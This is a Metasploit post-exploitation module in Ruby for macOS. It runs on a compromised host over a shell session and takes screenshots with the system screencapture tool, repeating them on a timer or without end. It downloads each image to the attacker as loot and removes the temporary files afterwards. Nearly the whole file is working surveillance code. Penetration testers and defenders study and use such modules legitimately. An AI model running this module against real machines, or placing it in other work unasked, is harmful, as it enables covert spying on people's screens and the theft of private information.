##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Screen Capture',
        'Description'   => %q{
          This module takes screenshots of target desktop and automatically downloads them.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
      ))

    register_options(
      [
        OptEnum.new('SNAP_FILETYPE',
          [true, 'File format to use when saving a snapshot', 'png', %w(png gif)]
        ),
        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds. 0 for no delay', 10]),
        OptInt.new('COUNT', [true, 'Number of screenshots to collect. 0 for no count', 1]),
        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/random']),
        OptString.new('EXE_PATH', [true, 'Path to remote screencapture program', '/usr/sbin/screencapture'])
      ], self.class)

  end

  def run
    tmp_path = datastore['TMP_PATH'].shellescape.gsub('random', Rex::Text.rand_text_alpha(8))
    execute("Create remote temp dir: ", "mkdir -p " + tmp_path)
    if datastore['COUNT'] == nil
      count = 1
    else
      count = datastore['COUNT']
    end
    if count == 0
      begin
        get_screenshot("Screenshot", tmp_path)
        delay()
      end until false
    else
      count.times do |num|
        if count == 1
          msg = "Screenshot"
        else
          msg = "Screenshot " + (num+1).to_s() + "/#{count}"
        end
        get_screenshot(msg, tmp_path)
        delay() unless ((num+1) == count)
      end
    end
    execute("Remove remote temp dir: ", "rmdir " + tmp_path)
  end

  def get_screenshot(msg, tmp_path)
    filename = Rex::Text.rand_text_alpha(7) + "." + datastore['SNAP_FILETYPE']
    file = tmp_path + "/" + filename

    execute("Save screenshot to remote temp folder:", datastore['EXE_PATH'].shellescape + " -C -t " + datastore['SNAP_FILETYPE'].shellescape + " " + file)
    data = cat_file(file)
    loot_file = save(msg, data, filename)
    execute("Remove remote temp file:", "rm " + file)
  end

  def delay()
    if datastore['DELAY'] != nil && datastore['DELAY'] != 0
      vprint_status("Delaying for " + datastore['DELAY'].to_s() + " seconds")
      Rex.sleep(datastore['DELAY'])
    end
  end

  def save(msg, data, filename, ctype="image/" + datastore['SNAP_FILETYPE'])
    ltype = "osx.screenshot"
    loot_file = store_loot(ltype, ctype, session, data, filename, msg)
    print_good("#{msg} stored in #{loot_file.to_s}")
  end

  def execute(msg, cmd)
    vprint_status("#{msg} #{cmd}")
    output = cmd_exec(cmd)
    return output
  end

  def cat_file(filename)
    print_status("Downloading screenshot: #{filename}")
    data = read_file(filename)
    return data
  end

end
